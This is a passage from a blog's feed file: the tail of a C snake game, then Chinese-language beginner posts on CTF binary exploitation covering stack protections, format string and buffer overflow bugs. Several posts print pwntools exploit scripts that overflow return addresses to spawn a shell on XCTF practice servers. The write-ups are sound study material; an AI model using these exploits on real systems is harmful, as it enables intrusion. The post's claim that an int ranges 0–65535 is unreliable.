operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"┏"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">==</span> SIZE<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">" ━━┓"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">" ━"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//输出中间内容</span><span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> SIZE<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">for</span> <span class="token punctuation">(</span>j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> SIZE<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>j <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment">//输出左边框</span><span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"┃ "</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>map<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment">//输出蛇头</span><span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"●"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>map<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment">//输出蛇身</span><span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"○"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>map<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment">//输出食物</span><span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"★"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"  "</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>j <span class="token operator">==</span> SIZE <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment">//输出右边框</span><span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"┃ "</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//输出下边框</span><span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> SIZE<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token comment">//输出下边框</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"┗"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">==</span> SIZE<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">" ━━┛"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">" ━"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n使用“w”“a”“s”“d”控制移动\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Power by Mark0519\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">/** power by mark0519* my blog:mark0519.github.io*/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> C </category>
          
      </categories>
      
      
        <tags>
            
            <tag> c </tag>
            
            <tag> code </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn前置基础</title>
      <link href="//post/pwn%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80.html"/>
      <url>//post/pwn%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80.html</url>
      
        <content type="html"><![CDATA[<h1 id="pwn入门2"><a href="#pwn入门2" class="headerlink" title="pwn入门2"></a>pwn入门2</h1><p>一些pwn的前置基础知识，入坑开始的地方~</p><span id="more"></span><h2 id="栈溢出及其返回地址（简略）"><a href="#栈溢出及其返回地址（简略）" class="headerlink" title="栈溢出及其返回地址（简略）"></a>栈溢出及其返回地址（简略）</h2><p>栈顶：esp<br>栈底：ebp</p><p>返回地址的地址位于 ebp，也就是栈底的地址加 4 个字节，假如 ebp 为 0xFF99C968, 那么返回地址就是 0XFF99C96C<br>中间相差 4(或者 8 个字节) 个字节，同时要说一下地址的数字越大代表在栈堆中的位置越往下，也可以理解为返回地址在栈底下面 4（或者）个字节。</p><p>例如 0x00007FFCB22FC5A0，这就是 64 位的栈地址，而这时候函数的返回地址就是栈底的地址加 8，也就是 0x00007FFCB22FC5F8</p><p>详细分析见我的内存模型和栈和堆的笔记</p><h2 id="checksec-指令"><a href="#checksec-指令" class="headerlink" title="checksec 指令"></a>checksec 指令</h2><p>用来查询 pwn 题目的壳和保护，并且能够看到程序的信息</p><pre class="line-numbers language-none"><code class="language-none">checksec (ELF文件名)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/bc5388af322d8b11f5e0d805bd6d4f15fa204194.png"></p><h2 id="常见保护"><a href="#常见保护" class="headerlink" title="常见保护"></a>常见保护</h2><h3 id="Canary"><a href="#Canary" class="headerlink" title="Canary"></a>Canary</h3><p>stack canary表示栈的报警保护。在函数返回值之前添加的一串随机数（不超过机器字长），末位为/x00（提供了覆盖最后一字节输出泄露canary的可能），如果出现缓冲区溢出攻击，覆盖内容覆盖到canary处，就会改变原本该处的数值，当程序执行到此处时，会检查canary值是否跟开始的值一样，如果不一样，程序会崩溃，从而达到保护返回地址的目的。</p><pre class="line-numbers language-none"><code class="language-none">gcc -o test test.c &#x2F;&#x2F; 默认情况下，不开启Canary保护gcc -fno-stack-protector -o test test.c &#x2F;&#x2F;禁用栈保护gcc -fstack-protector -o test test.c &#x2F;&#x2F;启用堆栈保护，不过只为局部变量中含有 char 数组的函数插入保护代码gcc -fstack-protector-all -o test test.c &#x2F;&#x2F;启用堆栈保护，为所有函数插入保护代码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="NX"><a href="#NX" class="headerlink" title="NX"></a>NX</h3><p>NX（DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。栈溢出的核心就是通过局部变量覆盖返回地址，然后加入shellcode，NX策略是使栈区域的代码无法执行。</p><pre class="line-numbers language-none"><code class="language-none">gcc -o test test.c &#x2F;&#x2F; 默认情况下，开启NX保护gcc -z execstack -o test test.c &#x2F;&#x2F; 禁用NX保护gcc -z noexecstack -o test test.c &#x2F;&#x2F; 开启NX保护<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="PIE-ASLR"><a href="#PIE-ASLR" class="headerlink" title="PIE(ASLR)"></a>PIE(ASLR)</h3><p>内存地址随机化机制（address space layout randomization)，有以下三种情况<br>0 - 表示关闭进程地址空间随机化。<br>1 - 表示将mmap的基址，stack和vdso页面随机化。<br>2 - 表示在1的基础上增加栈（heap）的随机化。</p><pre class="line-numbers language-none"><code class="language-none">gcc -o test test.c &#x2F;&#x2F; 默认情况下，不开启PIEgcc -fpie -pie -o test test.c &#x2F;&#x2F; 开启PIE，此时强度为1gcc -fPIE -pie -o test test.c &#x2F;&#x2F; 开启PIE，此时为最高强度2gcc -fpic -o test test.c &#x2F;&#x2F; 开启PIC，此时强度为1，不会开启PIEgcc -fPIC -o test test.c &#x2F;&#x2F; 开启PIC，此时为最高强度2，不会开启PIE<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>关闭 PIE</p><pre class="line-numbers language-none"><code class="language-none">sudo -s echo 0 &gt; &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="RELRO"><a href="#RELRO" class="headerlink" title="RELRO"></a>RELRO</h3><p>Partial RELRO：GCC 的默认设置，几乎所有的二进制文件都至少使用 部分RELRO。这样仅仅只能防止全局变量上的缓冲区溢出从而覆盖 GOT。</p><p>Full RELRO：使整个 GOT 只读，从而无法被覆盖，但这样会大大增加程序的启动时间，因为程序在启动之前需要解析所有的符号。</p><pre class="line-numbers language-none"><code class="language-none">gcc -o test test.c &#x2F;&#x2F; 默认情况下，是Partial RELROgcc -z norelro -o test test.c &#x2F;&#x2F; 关闭，即No RELROgcc -z lazy -o test test.c &#x2F;&#x2F; 部分开启，即Partial RELROgcc -z now -o test test.c &#x2F;&#x2F; 全部开启，即Full RELRO<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="常见基础漏洞"><a href="#常见基础漏洞" class="headerlink" title="常见基础漏洞"></a>常见基础漏洞</h2><h3 id="格式化字符串漏洞"><a href="#格式化字符串漏洞" class="headerlink" title="格式化字符串漏洞"></a>格式化字符串漏洞</h3><p>主要这个开启了 canary，就不能直接利用栈溢出覆盖返回地址了<br>所以可以通过格式化字符串漏洞泄露 canary 的值，然后再进行栈溢出的覆盖</p><p>格式化字符串漏洞是因为 printf 的输出完全由用户控制<br>一个是通过 %p（将参数以十六进制方式打印）来实现任意内存泄露<br>64 位前六个参数位于寄存器，第多少个 %p 是目的内存则可以通过栈帧进行计算，八位（0x8）为一个 %p<br>再就是通过 %n（把输出字符的个数写入到地址中）来实现任意内存写入</p><p>栈溢出需要注意的则是由于开启了 CANNARY，覆盖是需要注意把 canary 用原值覆盖</p><p>在使用输出功能时，例如使用 printf() 函数时<br>使用了如下的代码，<br>printf(&amp;s)，<br>当然这是种错误的写法<br>正确的写法是<br>printf(“%s”,s)<br>但是错误的写法可以运行么，答案是可以的。</p><h3 id="整数溢出漏洞"><a href="#整数溢出漏洞" class="headerlink" title="整数溢出漏洞"></a>整数溢出漏洞</h3><p>先贴一下 ctf 手册里面的定义。</p><p><img src="https://img-blog.csdnimg.cn/20200220154236609.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mzg0Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="img"></p><p>整数溢出的原理<br>假定一个整数，为 int 类型，我们要知道他的取值范围在 0-65535 之间<br>那么如果如果我们赋值给 var1=0,var2=65536, 那么在条件判断语句 if(var1==var2) 之下，他们两个是相等的，同理可得 var1=1=var2=65537。<br>这题我们就根据这样的原理来作答。</p><h3 id="gets-函数所产生的漏洞"><a href="#gets-函数所产生的漏洞" class="headerlink" title="gets 函数所产生的漏洞"></a>gets 函数所产生的漏洞</h3><p>gets 函数不会限制输入的字符个数，所以会产生栈溢出漏洞</p><p>这里举个攻防世界的例子：<br>when_did_you_born</p><p>例如下图所示，我们就可以看到这个程序打开了 NX 保护和 Canary 保护，同时知道了它是一个 64 位的程序</p><p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/bc5388af322d8b11f5e0d805bd6d4f15fa204194.png" alt="img"></p><p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/271531708ecc321881d650eb257bd94d1c0182e3.png"></p><p>可以看到gets（）函数不限制输入字符串的长度</p><p>故构造exp：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>c<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">'220.249.52.133'</span><span class="token punctuation">,</span><span class="token number">35638</span><span class="token punctuation">)</span>c<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"What's Your Birth?"</span><span class="token punctuation">)</span>c<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1999"</span><span class="token punctuation">)</span>c<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"What's Your Name?"</span><span class="token punctuation">)</span>p<span class="token operator">=</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x20</span><span class="token operator">-</span><span class="token number">0x18</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">1926</span><span class="token punctuation">)</span>       <span class="token comment">#gets()的栈溢出</span>c<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>p<span class="token punctuation">)</span>c<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h3><p>返回导向编程技术（Return-Oriented Programming，ROP）。所谓ROP，简单的说就是把原来已经存在的代码块拼接起来，拼接的方式是通过一个预先准备好的特殊的返回栈，里面包含了各条指令结束后下一条指令的地址。</p><p>同样使用攻防世界的题目举例：</p><p>file命令查看elf为32位的程序，拖到IDA打开</p><p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/ecac8c82456c2a22029b9f0ab6e0d02d321baf0e.png"></p><p>发现system函数和vulnerable_function()函数</p><p>进入vulnerable_function()函数：</p><p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/9a99d96a8a2cc2c7956c2e9a0db9d6ecb68524c5.png"></p><p>注意到数组buf长度为0x88，而read函数允许读入长度为0x100，存在明显栈溢出漏洞</p><p>且查找发现有字符串：\bin\sh</p><p>故查找system函数\bin\sh的地址，构造exp</p><p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/d79f112e9cb25131aa3668c00fca31e6ec069f27.png"></p><p>system地址：0x08048320</p><p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/aec767cb09bcf2dc3943fb67e28e22d89e58c926.png"></p><p>\bin\sh地址：0x0804A024</p><p><strong>注意：程序为32位，ebp地址为4个字符</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#exp</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>c<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">'220.249.52.133'</span><span class="token punctuation">,</span><span class="token number">34222</span><span class="token punctuation">)</span>c<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Input:"</span><span class="token punctuation">)</span>p<span class="token operator">=</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x88</span><span class="token operator">+</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">4</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x08048320</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">4</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x0804A024</span><span class="token punctuation">)</span>  <span class="token comment">#两个‘a’*4为覆盖他们栈帧的ebp</span>c<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>p<span class="token punctuation">)</span>c<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> python2 </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn_简单的ROP面向返回的编程</title>
      <link href="//post/pwn-ROP%E9%9D%A2%E5%90%91%E8%BF%94%E5%9B%9E%E7%9A%84%E7%BC%96%E7%A8%8B.html"/>
      <url>//post/pwn-ROP%E9%9D%A2%E5%90%91%E8%BF%94%E5%9B%9E%E7%9A%84%E7%BC%96%E7%A8%8B.html</url>
      
        <content type="html"><![CDATA[<h1 id="pwn-简单的ROP面向返回的编程"><a href="#pwn-简单的ROP面向返回的编程" class="headerlink" title="pwn_简单的ROP面向返回的编程"></a>pwn_简单的ROP面向返回的编程</h1><p>返回导向编程技术（Return-Oriented Programming，ROP）。所谓ROP，简单的说就是把原来已经存在的代码块拼接起来，拼接的方式是通过一个预先准备好的特殊的返回栈，里面包含了各条指令结束后下一条指令的地址。</p><span id="more"></span><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>攻防世界level2：<a href="https://adworld.xctf.org.cn/task/answer?type=pwn&amp;number=2&amp;grade=0&amp;id=5055&amp;page=1">https://adworld.xctf.org.cn/task/answer?type=pwn&amp;number=2&amp;grade=0&amp;id=5055&amp;page=1</a></p><h2 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h2><p>file命令查看elf为32位的程序，拖到IDA打开</p><p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/ecac8c82456c2a22029b9f0ab6e0d02d321baf0e.png"></p><p>发现system函数和vulnerable_function()函数</p><p>进入vulnerable_function()函数：</p><p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/9a99d96a8a2cc2c7956c2e9a0db9d6ecb68524c5.png"></p><p>注意到数组buf长度为0x88，而read函数允许读入长度为0x100，存在明显栈溢出漏洞</p><p>且查找发现有字符串：\bin\sh</p><p>故查找system函数\bin\sh的地址，构造exp</p><p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/d79f112e9cb25131aa3668c00fca31e6ec069f27.png"></p><p>system地址：0x08048320</p><p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/aec767cb09bcf2dc3943fb67e28e22d89e58c926.png"></p><p>\bin\sh地址：0x0804A024</p><p><strong>注意：程序为32位，ebp地址为4个字符</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#exp</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>c<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">'220.249.52.133'</span><span class="token punctuation">,</span><span class="token number">34222</span><span class="token punctuation">)</span>c<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Input:"</span><span class="token punctuation">)</span>p<span class="token operator">=</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x88</span><span class="token operator">+</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">4</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x08048320</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">4</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x0804A024</span><span class="token punctuation">)</span>  <span class="token comment">#两个‘a’*4为覆盖他们栈帧的ebp</span>c<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>p<span class="token punctuation">)</span>c<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> python2 </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn入门0.1</title>
      <link href="//post/pwn%E5%85%A5%E9%97%A80-1.html"/>
      <url>//post/pwn%E5%85%A5%E9%97%A80-1.html</url>
      
        <content type="html"><![CDATA[<h1 id="pwn入门"><a href="#pwn入门" class="headerlink" title="pwn入门"></a>pwn入门</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>攻防世界pwn level0</p><span id="more"></span><p>链接：<a href="https://adworld.xctf.org.cn/task/answer?type=pwn&amp;number=2&amp;grade=0&amp;id=5053&amp;page=1">https://adworld.xctf.org.cn/task/answer?type=pwn&amp;number=2&amp;grade=0&amp;id=5053&amp;page=1</a></p><h2 id="渣渣自己写的wp"><a href="#渣渣自己写的wp" class="headerlink" title="渣渣自己写的wp"></a>渣渣自己写的wp</h2><p>查文件是64位的，拖到IDA里面看源码：</p><p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/31dd5ec6910452b7dd0837ebc9400e27be8b5019.png"></p><p>查看wulnerable_function()函数</p><p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/85992a05ed4f6dff24f11a6c0f2cb0fceccfb527.png"></p><p>buf数组距离栈帧顶部rsp为0x0h，距离栈帧顶部rbp为0x80h，可知buf长度为0x80.</p><p>而read函数允许读取长度为0x200的字符，是一个明显的栈溢出漏洞</p><p>查看vulnerable函数栈</p><p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/ed553f4936f772ff0b8fc345024543e8cbbe3c24.png"></p><p><strong>s代表save ebp,长度8个字节<br>r代表return address,长度8个字节,通常只要覆盖4个字节。</strong></p><p>故可以构造字符串填充覆盖return address</p><p>查看函数列表发现有一个callsystem函数是我们需要的</p><p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/16a18c2443ef8b91edbd172b4f4cfeca3a43edec.png"></p><p>或者按shift+f12查看关键字符串</p><p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/7f83be3bf8260874e79ce55b19c4e12a4b49b677.png"></p><p>也可以发现/bin/sh，来找到callsystem函数</p><p>查找该函数的地址：</p><p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/fed2ecafd622d2c688bc1844d0d9bf9897fdb6c1.png"></p><p>得到：0x400596</p><p>故构造exp</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>c<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">'220.249.52.133'</span><span class="token punctuation">,</span><span class="token number">41178</span><span class="token punctuation">)</span>p<span class="token operator">=</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x80</span><span class="token operator">+</span><span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x08</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x400596</span><span class="token punctuation">)</span>c<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Hello, World\n"</span><span class="token punctuation">)</span>c<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>p<span class="token punctuation">)</span>c<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/fb3796bbf5f366700038188105376cac2f96c3e8.png"></p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> python2 </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn学习-exp</title>
      <link href="//post/pwn-learn-exp.html"/>
      <url>//post/pwn-learn-exp.html</url>
      
        <content type="html"><![CDATA[<h1 id="pwn学习-exp"><a href="#pwn学习-exp" class="headerlink" title="pwn学习-exp"></a>pwn学习-exp</h1><p>exp是exploit的简写，编写exp需要用到pwntools</p><span id="more"></span><h2 id="编写一个exp的基本框架："><a href="#编写一个exp的基本框架：" class="headerlink" title="编写一个exp的基本框架："></a>编写一个exp的基本框架：</h2><p>from pwn import *</p><p>  p = process(bin路径)  #在本地调试</p><p>else:</p><p>  p = remote(‘ip’, port) # 连接其他主机的服务 需要输入对应的ip地址和端口号</p><p>… # 输入payload来进行操作以拿到程序的shell</p><p>p.interactive() # 反弹shell</p><h2 id="io交互："><a href="#io交互：" class="headerlink" title="io交互："></a>io交互：</h2><p><strong>形式都是str类型</strong></p><p>recv()：接受收到的所有字符</p><p>recvuntil(str)：接收到第一次出现str的内容为止</p><p>recvline()：接受一行</p><p>send(str)：发送str的内容，<strong>如果需要发送数字，需要加上str()</strong></p><p>sendline(str)：发送str的内容并加上回车（”\n”）发送，推荐优先于send</p><h2 id="打包解包数据："><a href="#打包解包数据：" class="headerlink" title="打包解包数据："></a>打包解包数据：</h2><p>为了把我们理解的数据转化成机器需要的数据形式</p><p>打包数据可以一般常用p64() 和 p32() ,分别对应32位和64位的ELF，当然也有p8等这种不常见的操作。</p><p>解包数据则对应为u64() 和 u32()</p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> python2 </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第一道pwn题</title>
      <link href="//post/my-first-pwn.html"/>
      <url>//post/my-first-pwn.html</url>
      
